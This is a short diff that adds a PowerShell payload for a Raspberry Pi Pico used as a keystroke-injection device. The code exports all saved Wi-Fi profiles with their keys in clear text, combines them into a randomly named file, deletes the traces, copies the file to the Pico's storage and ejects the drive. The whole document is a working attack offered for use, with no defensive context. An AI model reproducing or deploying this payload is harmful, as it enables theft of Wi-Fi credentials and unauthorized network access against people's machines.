@@ -1,0 +1,14 @@
+# Payload created by: MrP1r4t3
+# Steal wifi password and output to raspberrypi pico storage then eject
+
+$BlixorStrings = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
+$BlixorsPath = [System.IO.Path]::GetTempPath()
+cd $BlixorsPath
+netsh wlan export profile key=clear
+cat *.xml > "${BlixorStrings}.blx"
+del *.xml
+$picodrive = Get-Volume -FileSystemLabel 'MICRO BLIX'
+$picoletter = $picodrive.DriveLetter
+Move-Item "${BlixorStrings}.blx" ${picoletter}:
+$driveEject = New-Object -comObject Shell.Application
+-exec $driveEject.Namespace(17).ParseName("${picoletter}:").InvokeVerb("Eject")
